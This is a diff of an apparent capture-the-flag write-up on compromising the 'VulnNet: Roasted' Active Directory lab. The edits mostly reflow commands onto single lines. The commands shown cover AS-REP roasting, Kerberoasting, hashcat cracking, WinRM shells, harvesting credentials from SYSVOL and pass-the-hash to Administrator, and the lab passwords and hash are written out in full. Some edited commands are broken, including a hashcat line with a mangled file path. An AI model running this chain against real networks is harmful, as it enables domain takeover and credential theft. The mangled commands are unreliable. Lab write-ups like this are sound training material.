@@ -175,11 +175,7 @@ enterprise-core-vn
 administrator
 EOF
 
-impacket-GetNPUsers vulnnet-rst.local/ \
-    -usersfile users.txt \
-    -dc-ip 10.81.139.27 \
-    -no-pass \
-    -format hashcat
+impacket-GetNPUsers vulnnet-rst.local/ -usersfile users.txt -dc-ip 10.81.139.27 -no-pass 
 ```
 
 ```
@@ -194,9 +190,7 @@ $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:a0fd51f1b68ab702b4fd5f0545a7c6f1$...
 One account vulnerable: **t-skid**. Hash saved, time to crack.
 
 ```bash
-hashcat -m 18200 t-skid.hash \
-        /usr/share/wordlists/rockyou.txt \
-        --force
+hashcat -m 18200 skid usr/share/wordlists/rockyou.txt 
 ```
 
 ```
@@ -219,9 +213,7 @@ nxc smb 10.81.139.27 -u 't-skid' -p 'tj072889*'
 With valid domain creds in our possession, time to enumerate service accounts with SPNs.
 
 ```bash
-impacket-GetUserSPNs vulnnet-rst.local/t-skid:'tj072889*' \
-    -dc-ip 10.81.139.27 \
-    -request
+impacket-GetUserSPNs vulnnet-rst.local/t-skid:'tj072889*' -dc-ip 10.81.139.27 -request
 ```
 
 ```
@@ -237,9 +229,7 @@ Two things we got:
 2. It's a member of **Remote Management Users** — WinRM access incoming
 
 ```bash
-hashcat -m 13100 enterprise.hash \
-        /usr/share/wordlists/rockyou.txt \
-        --force
+hashcat -m 13100 enterprise.hash /usr/share/wordlists/rockyou.txt 
 ```
 
 ```
@@ -253,14 +243,12 @@ $krb5tgs$23$*enterprise-core-vn...[hash]...:ry=ibfkfv,s6h,
 ### WinRM Shell
 
 ```bash
-nxc winrm 10.81.139.27 \
-    -u 'enterprise-core-vn' \
-    -p 'ry=ibfkfv,s6h,'
+nxc winrm 10.81.139.27 -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,'
+
 # [+] vulnnet-rst.local\enterprise-core-vn:ry=ibfkfv,s6h, (Pwn3d!)
 
-evil-winrm -i 10.81.139.27 \
-           -u 'enterprise-core-vn' \
-           -p 'ry=ibfkfv,s6h,'
+evil-winrm -i 10.81.139.27 -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,'
+
 ```
 
 We're in.
@@ -286,9 +274,7 @@ store scripts there for automated tasks. Sometimes those scripts contain
 hardcoded credentials. Let's check.
 
 ```bash
-smbclient //10.81.174.210/SYSVOL \
-    -U 'enterprise-core-vn%ry=ibfkfv,s6h,' \
-    -W VULNNET-RST
+smbclient //10.81.174.210/SYSVOL -U 'enterprise-core-vn%ry=ibfkfv,s6h,' -W VULNNET-RST
 
 smb: \> recurse ON
 smb: \> prompt OFF
@@ -324,9 +310,7 @@ Every sysadmin's nightmare.
 ### Verifying a-whitehat
 
 ```bash
-nxc winrm 10.81.174.210 \
-    -u 'a-whitehat' \
-    -p 'bNdKVkjv3RR9ht'
+nxc winrm 10.81.174.210 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'
 ```
 
 ```
@@ -359,9 +343,7 @@ Full domain hash dump. Administrator NTLM: `c2597747aa5e43022a3a3049a3c3b09d`
 ### Pass-the-Hash → Root
 
 ```bash
-evil-winrm -i 10.81.174.210 \
-           -u 'Administrator' \
-           -H 'c2597747aa5e43022a3a3049a3c3b09d'
+evil-winrm -i 10.81.174.210 -u 'Administrator' -H 'c2597747aa5e43022a3a3049a3c3b09d'
 ```
 
 ```powershell
@@ -386,7 +368,7 @@ Domain pwned.
 
 ---
 
-## Key Takeaways
+## What did we Learn?
 
 **1. Anonymous shares leak employee info**
 The txt files in VulnNet-Business-Anonymous and VulnNet-Enterprise-Anonymous
